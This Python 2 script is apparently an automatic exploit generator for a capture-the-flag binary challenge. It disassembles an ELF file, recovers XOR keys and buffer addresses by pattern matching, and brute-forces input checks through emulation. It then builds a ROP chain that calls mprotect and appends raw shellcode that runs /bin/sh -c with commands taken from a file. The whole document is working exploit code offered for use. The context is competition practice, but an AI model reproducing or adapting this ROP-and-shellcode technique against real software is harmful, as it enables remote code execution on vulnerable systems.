#!/usr/bin/python -i

#import elftools
import struct
import sys
from elftools.elf.elffile import ELFFile
import capstone as cs
#import keystone as ks


class MmapManager(object):
    def __init__(self):
        self.maps = []

    def memmap(self, addr, data):
        self.maps.append((addr, data))

    def read_mem(self, addr, length):
        for i, d in self.maps:
            if i <= addr < i+len(d):
                return d[addr-i:addr-i+length]
        return None


class OneInstCondition(object):
    def __init__(self):
        pass

    def __call__(self, il, addr):
        return len(il) > 0


class NInstCondition(OneInstCondition):
    def __init__(self, n):
        self.n = n
        pass

    def __call__(self, il, addr):
        return len(il) >= n


class MnemonicCondition(OneInstCondition):
    def __init__(self):
        pass

    def __call__(self, il, addr):
        return il and self.term(il[-1].mnemonic)

    def term(self, name):
        return bool(name)


class BasicBlockEndCondition(MnemonicCondition):

    def term(self, name):
        return name[0] == 'j'


class BasicBlockEndOrCallCondition(MnemonicCondition):

    def term(self, name):
        return name[0] == 'j' or name in ['call', 'hlt', 'ud', 'ud2', 'ret', 'repz ret']


class SpecInstnameCondition(MnemonicCondition):
    def __init__(self, end_inst):
        self.end_inst = end_inst

    def term(self, name):
        return name == self.end_inst


until_call = SpecInstnameCondition('call')
until_ret = SpecInstnameCondition('ret')


class Disasmer(object):
    def __init__(self, mm, md):
        self.cache = {}
        self.mm = mm
        self.md = md

    def disasm_raw(self, addr):
        rd = self.mm.read_mem(addr, 15)
        if rd is None:
            print 'Warning: address is unmapped:', hex(addr)
            return None
        it = self.md.disasm(rd, addr)
        try:
            return next(it)
        except StopIteration:
            print 'Warning: address is un-disasm-able:', hex(addr)
            return None

    def disasm(self, addr):
        if addr in self.cache:
            return self.cache[addr]
        else:
            ret = self.disasm_raw(addr)
            self.cache[addr] = ret
            return ret

    def disasm_until(self, addr, stop_cond, max_inst=9999):
        il = []
        while not stop_cond(il, addr):
            if len(il) >= max_inst:
                print 'Warning: inst count reached max limit'
            v = self.disasm(addr)
            if v is None:
                return il
            il.append(v)
            addr += v.size
        return il


def print_il(il):
    for h, i in enumerate(il):
        print '{:3d}{:#20x} {:>7s} {:40s}'.format(h, i.address, i.mnemonic, i.op_str)


def print_il_patt(il):
    for h, i in enumerate(il):
        print '{:>7s} {:10s} # {:#20x}, {:d}'.format(i.mnemonic, '_ '*(i.op_str.count(',')+1), i.address, h)


def match_sub(inst, patt_s, d):
    pal = [i.strip() for i in patt_s.split()]
    if pal[0] != inst.mnemonic:
        return False
    if len(pal) > 1:
        vv = inst.op_str.split(',')
        for i in range(len(pal)-1):
            d[pal[i+1]] = vv[i].strip()
    return True


def match(il, pattern):
    pattern_l = [i.strip() for i in pattern.split('\n')]
    pattern_l = [i if '#' not in i else i[:i.find(
        '#')].strip() for i in pattern_l if i and i[0] != '#']
    for i in range(len(il)-len(pattern_l)+1):
        d = {'_index': i}
        mismatch = False
        for j in range(len(pattern_l)):
            if not match_sub(il[i+j], pattern_l[j], d):
                mismatch = True
                # print 'fail:',i,j
                break
        if not mismatch:
            return d

# script


if len(sys.argv) > 1:
    filename = sys.argv[1]
else:
    filename = '0.elf'

elf = ELFFile(open(filename))

mm = MmapManager()

for seg in elf.iter_segments():
    if seg['p_type'] == 'PT_LOAD':
        mm.memmap(seg['p_vaddr'], seg.data())

entry = elf['e_entry']

da = Disasmer(mm, cs.Cs(cs.CS_ARCH_X86, cs.CS_MODE_64))
# determine main function

start_il = da.disasm_until(entry, BasicBlockEndOrCallCondition())
for i in start_il:
    if i.mnemonic == 'mov' and 'rdi' in i.op_str:
        main_addr = int(i.op_str.split()[-1], 0)
        print 'main found'
    if i.mnemonic == 'mov' and 'rcx' in i.op_str:
        init_addr = int(i.op_str.split()[-1], 0)
        print 'init found'
# else:
#    print 'cannot find main address'
#    exit()
print 'main address', hex(main_addr)
#print_il(da.disasm_until(entry, until_call))

init_func = da.disasm_until(init_addr, until_ret)
init_gadget1 = init_func[27].address
init_gadget2 = init_func[19].address
nop_gadget = init_func[-1].address
# print_il_patt(init_func)
# exit()

main_func = da.disasm_until(main_addr, until_ret)

# print_il_patt(main_func)

patt1 = '''
    mov _ _        #            0x2814727, 100
    and _ _        #            0x281472a, 101
   test _ _        #            0x281472d, 102
    jne _          #            0x281472f, 103
    mov _ _        #            0x2814731, 104
 movsxd _ _        #            0x2814734, 105
    lea _ _        #            0x2814737, 106
  movzx _ _        #            0x281473e, 107
    xor _ k1       #            0x2814742, 108
    mov _ _        #            0x2814745, 109
    mov _ _        #            0x2814747, 110
 movsxd _ _        #            0x281474a, 111
    lea _ _        #            0x281474d, 112
    mov _ _        #            0x2814754, 113
    jmp _          #            0x2814757, 114
    mov _ _        #            0x2814759, 115
 movsxd _ _        #            0x281475c, 116
    lea _ _        #            0x281475f, 117
  movzx _ _        #            0x2814766, 118
    xor _ k2       #            0x281476a, 119
    mov _ _        #            0x281476d, 120
    mov _ _        #            0x281476f, 121
 movsxd _ _        #            0x2814772, 122
    lea _ _        #            0x2814775, 123
    mov _ _        #            0x281477c, 124
'''

xorkey_d = match(main_func, patt1)
k1 = int(xorkey_d['k1'], 0) & 0xff
k2 = int(xorkey_d['k2'], 0) & 0xff
print 'k1', hex(k1), 'k2', hex(k2)

patt2 = '''
  movzx _ _        #            0x281482f, 185
  movzx _ _        #            0x2814836, 186
  movzx _ _        #            0x2814839, 187
  movzx _ _        #            0x2814840, 188
  movzx _ base     #            0x2814843, 189
  movzx _ _        #            0x281484a, 190
    mov _ _        #            0x281484d, 191
    mov _ _        #            0x281484f, 192
   call target     #            0x2814851, 193
'''

check_d = match(main_func, patt2)
check_addr = int(check_d['target'], 0)
buf_base = check_d['base']
assert buf_base.startswith('byte ptr [rip +')
buf_base = int(buf_base.split('+')[1].strip().strip(']'), 0)
buf_base += main_func[check_d['_index']+5].address

print 'checker entry', hex(check_addr)
print 'buffer base', hex(buf_base)

payload = [0xcc]*1000

x86_same_reg = [
    ('rax', 'eax', 'ax', 'al'),
    ('rbx', 'ebx', 'bx', 'bl'),
    ('rcx', 'ecx', 'cx', 'cl'),
    ('rdx', 'edx', 'dx', 'dl'),
    ('rdi', 'edi', 'di'),
    ('rsi', 'esi', 'si'),
    ('rbp', 'ebp', 'bp'),
    ('rsp', 'esp', 'sp'),
    ('rip', 'eip', 'ip'),
]

base_reg = {}
for i in x86_same_reg:
    for j in i:
        base_reg[j] = i[0]


def try_solve_i(argf, il):
    ll = []
    for i in range(256):
        vs = init_vars(argf(i))
        ll.append(emulate(il, vs))
    maxl = max(ll)
    minl = min(ll)
    if ll.count(minl) != 255:
        print 'New pattern'
        for i in range(16):
            print ' '.join(['%4d' % ll[j+i*16]for j in range(16)])
    ll = ll[0x30:]+ll[:0x30]
    #raise NotImplementedError('pattern todo')
    return 0xff & (ll.index(maxl)+0x30)


def try_solve(il, n):
    l = []
    for i in range(n):
        l.append(try_solve_i(lambda x: l+[x, 0, 0, 0], il))
    return l


def init_vars(arg):
    vs = {}
    vs['rax'] = 0
    vs['rbx'] = 0
    for i, j in zip(arg, ['rdi', 'rsi', 'rdx', 'rcx']):
        vs[j] = i
    vs['rbp'] = 0
    vs['rsp'] = 0x20fff8
    return vs


def emulate(il, vs):
    for h, i in enumerate(il):
        vs['rip'] = i.address+i.size
        stop_flag = emulate_i(i, vs)
        if stop_flag:
            return h
    return len(il)


def e_lea(vs, name):
    name = name[name.find('[')+1:name.find(']')]
    name = name.split()
    if len(name) == 3:
        vl = [e_read(vs, name[0]), e_read(vs, name[2])]
        if name[1] == '-':
            vl[1] = -vl[1]
        return vl[0]+vl[1]
    elif len(name) == 1:
        return e_read(vs, name[0])
    elif len(name) == 5:
        vl = [e_read(vs, name[0]), e_read(vs, name[2]), e_read(vs, name[4])]
        if name[1] == '-':
            vl[1] = -vl[1]
        if name[3] == '-':
            vl[2] = -vl[2]
        return vl[0]+vl[1]+vl[2]
    else:
        raise NotImplementedError('lea expression: {}'.format(name))


def e_write(vs, name, val):
    assert name[0] not in '-+0123456789'
    if 'ptr' in name:
        # memory
        # if not(name.startswith('byte ptr [') or  name.startswith('dword ptr [')):
        #    print 'name failed for writing',name
        #assert name.startswith('byte ptr [') or  name.startswith('dword ptr [')
        assert name.endswith(']')
        addr = e_lea(vs, name)
        vs[addr] = val
    else:
        # reg
        assert ' ' not in name
        vs[base_reg[name]] = val


def S32(x):
    x = x & 0xffffffff
    if x & 0x80000000:
        x -= 0x100000000
    return x


def U32(x):
    x = x & 0xffffffff
    return x


def e_read(vs, name):
    if '[' not in name and '*' in name:
        l = name.split('*')
        return e_read(vs, l[0])*e_read(vs, l[1])
    if name[0] in '-+0123456789':
        return int(name, 0)
    if 'ptr' in name:
        # memory
        #assert name.startswith('byte ptr [')
        if not name.endswith(']'):
            print 'not memory?'
            print name
            raise Exception
        addr = e_lea(vs, name)
        if addr not in vs:
            return 0
        return vs[addr]
    else:
        # reg
        assert ' ' not in name
        v = vs[base_reg[name]]
        if name[0] == 'e':
            v = v & 0xffffffff
        return v


def emulate_i(inst, vs):
    mn = inst.mnemonic
    if mn == 'push':
        return False
    if mn == 'call':
        return True
    if mn == 'jne':
        return not vs['zero']
    # if 'rip' in inst.op_str:
    #    #print 'inst', hex(inst.address), inst.mnemonic, inst.op_str
    #    #raise Exception()
    ops = [i.strip() for i in inst.op_str.split(',')]
    if not len(ops) == 2:
        if mn == 'imul':
            assert ops[0] == 'edx'
            eax = e_read(vs, 'eax') & 0xffffffff
            operand = e_read(vs, ops[0]) & 0xffffffff
            res = eax*operand
            e_write(vs, 'eax', res & 0xffffffff)
            e_write(vs, 'edx', (res >> 32) & 0xffffffff)
        elif mn == 'cdqe':
            #e_write(vs, 'edx', 0)
            pass
        elif mn == 'cdq':
            e_write(vs, 'edx', 0)
        else:
            print 'Unhandled operation'
            print hex(inst.address), inst.mnemonic, inst.op_str
            raise NotImplementedError('Unhandled')
        return
    if mn == 'mov':
        e_write(vs, ops[0], e_read(vs, ops[1]))
    elif mn == 'lea':
        e_write(vs, ops[0], e_lea(vs, ops[1]))
    elif mn == 'movzx':
        e_write(vs, ops[0], e_read(vs, ops[1]) & 0xff)
    elif mn == 'sub':
        e_write(vs, ops[0], e_read(vs, ops[0])-e_read(vs, ops[1]))
    elif mn == 'add':
        e_write(vs, ops[0], e_read(vs, ops[0])+e_read(vs, ops[1]))
    elif mn == 'and':
        e_write(vs, ops[0], e_read(vs, ops[0]) & e_read(vs, ops[1]))
    elif mn == 'shl':
        e_write(vs, ops[0], e_read(vs, ops[0]) << (e_read(vs, ops[1]) & 0x3f))
    elif mn == 'sar':
        e_write(vs, ops[0], U32(S32(e_read(vs, ops[0]))
                                >> (e_read(vs, ops[1]) & 0x3f)))
    elif mn == 'shr':
        e_write(vs, ops[0], U32(U32(e_read(vs, ops[0]))
                                >> (e_read(vs, ops[1]) & 0x3f)))
    elif mn == 'imul':
        e_write(vs, ops[0], e_read(vs, ops[0])*e_read(vs, ops[1]))
    elif mn == 'cmp':
        # print 'ops', ops, 'assumed 8bit'

        if not(ops[0][-1] == 'l' or ops[0].startswith('byte ptr')):
            if ops[0] != 'eax':
                print 'Not a byte compare'
                print hex(inst.address), inst.mnemonic, inst.op_str
                raise NotImplementedError('Unhandled')
        vs['zero'] = ((e_read(vs, ops[0])-e_read(vs, ops[1])) & 0xff) == 0
    else:
        raise NotImplementedError('mnemonic: '+mn)


ns = [3]*16+[1]*4

nt = 0

for i in range(19):
    print 'i', i, hex(check_addr)
    check_func = da.disasm_until(check_addr, until_ret)
    l = try_solve(check_func, n=ns[i])
    for j in range(len(l)):
        payload[nt] = l[j]
        nt += 1
    d = match(check_func, '''
    call next
    ''')
    if not d:
        print 'Unmatched'
        break
    else:
        # print d
        check_addr = int(d['next'], 0)
        # print 'inp', payload[:70]

check_func = da.disasm_until(check_addr, until_ret)
print_il_patt(check_func)

patt3 = '''
   push _          #             0x2112c3, 0
    mov _ _        #             0x2112c4, 1
    sub _ _        #             0x2112c7, 2
    lea _ _        #             0x2112cb, 3
    mov _ _        #             0x2112d2, 4
    lea _ pref     #             0x2112d6, 5
    mov _ _        #             0x2112dd, 6
'''
patt4 = '''
movsxd
mov
sub
lea
add
mov
lea _ bufoff
mov
mov
call
'''

pref_d = match(check_func, patt3)
s_base = pref_d['pref']
print 's_base', s_base
s_base = int(s_base.split('+')[1].strip().strip(']'), 0)
s_base += check_func[pref_d['_index']+6].address


overf_d = match(check_func, patt4)
bufoff = int(overf_d['bufoff'].split()[-1].strip().strip(']'),0)
print 'bufoff', hex(bufoff)

pref_str = mm.read_mem(s_base, 16).split('\0')[0]
prefix = (str(bytearray(payload[:64])+pref_str)+'7'*bufoff)
print 'pref_str', repr(bytearray(pref_str))


class PltEvaler(object):
    def __init__(self, filename, addend=0):
        self.filename = filename
        with open(filename, 'rb') as f:
            self.raw = bytearray(f.read())
        self.elffile = ELFFile(open(filename, 'rb'))
        self.reladyn = self.elffile.get_section_by_name('.rela.plt')
        self.symtab = self.elffile.get_section_by_name('.dynsym')
        self.off_d = {reloc['r_offset']: reloc for reloc in self.reladyn.iter_relocations()}
        self.addend = addend
        self.got_itable = {}

    def resolve_got(self, off):
        if off not in self.off_d:
            return None
        nm = self.symtab.get_symbol(self.off_d[off]['r_info_sym']).name
        self.got_itable[nm] = off
        return nm

    def resolve_plt(self, off):
        if self.raw[off] != 0xff and self.raw[off+1] != 0x25:
            return None
        ret = self.resolve_got(off+6+b2i(self.raw[off+2:off+6])+self.addend)
        if ret is None:
            print '[!?] GOT address not found:', hex(off)
            pass
        return ret
    #from IPython import embed
    # embed()


def b2i(b):
    return sum(j << (i*8) for i, j in enumerate(b))


pe = PltEvaler(filename, 0x400000)
# find mprotect
for i in range(0, 0x1000, 0x10):
    if pe.resolve_plt(i) == 'mprotect':
        mprotect_addr = 0x400000+i
        mprotect_got = pe.got_itable['mprotect']
        break
else:
    print 'Cannot find mprotect'
    exit()

payload = ''.join(chr(i & 0xff) for i in range(900))
ropchain = [nop_gadget]*16+[init_gadget1, 0, 1, mprotect_got, buf_base & -0x1000, 0x1000 +
                            ((buf_base+1000) & -0x1000)-(buf_base & -0x1000), 7, init_gadget2, 0xdeadbee1, 0, 1, 2, 3, 4, 5, buf_base+512]
print 'rop chain'
for i in ropchain:
    print hex(i)
rop = ''.join(struct.pack('<Q', i)for i in ropchain)
# ma=ks.Ks(ks.KS_ARCH_X86,ks.KS_MODE_64)
shellcode = '777Helloworldhello123'
shellcode = "1\xd2RH\x8d\x05)\x00\x00\x00PH\x8d\x05\x1e\x00\x00\x00PH\x8d\x05\x0e\x00\x00\x00PP_1\xd2T^j;X\x0f\x05\x0f\x0b/bin/sh\x00-c\x00"
with open('command') as f:
    cmd=';'.join(f.read().split('\n'))#'echo "Good";ls;cat flag;echo "Goodend"'
shellcode+=cmd+'\0'    
#'hflagj\x02XH\x89\xe71\xf6\x99\x0f\x05A\xba\xff\xff\xff\x7fH\x89\xc6j(Xj\x01_\x99\x0f\x05'  # ma.asm('''


# ''',0)
payload = rop.ljust(512, '\x90')+shellcode
payload = payload.ljust(800, '\x90')
# payload=payload[:0x60]
# payload+=

# print pe.resolve_plt(0x7c0)
# for i in range(0x400000,0x401000):
#    func_name = pe.resolve_plt(i)
#    if func_name:
#        print hex(i), func_name


def xor_encode(s, k1, k2):
    return ''.join(chr(i ^ [k1, k2][h & 1])for h, i in enumerate(bytearray(s)))


with open('payload', 'w') as f:
    f.write(xor_encode(prefix+payload, k1, k2).encode('hex'))

# print_il_patt(check_func)
# print 'xorkey d', xorkey_d
